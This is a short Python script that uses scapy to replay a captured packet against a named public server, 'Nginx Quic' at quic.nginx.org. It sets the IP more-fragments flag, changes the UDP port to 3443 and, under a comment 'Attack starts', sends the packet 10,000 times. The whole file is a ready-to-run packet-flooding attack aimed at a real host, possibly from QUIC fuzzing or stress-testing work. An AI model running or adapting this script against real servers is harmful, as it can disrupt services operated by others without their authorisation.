# Server : Nginx Quic
# Link : https://quic.nginx.org/

from scapy.all import *

packetCollection = rdpcap("packet.pcapng")
packet = packetCollection[0]

# Changes applied

packet[IP].flags = 1        # Changed the flag of IP layer
packet[UDP].dport = 3443    # Changing the dport in UDP layer

packet.show()

# Attack starts

cnt=1

while cnt <= 10000:
    sendp(packet)
    cnt = cnt + 1
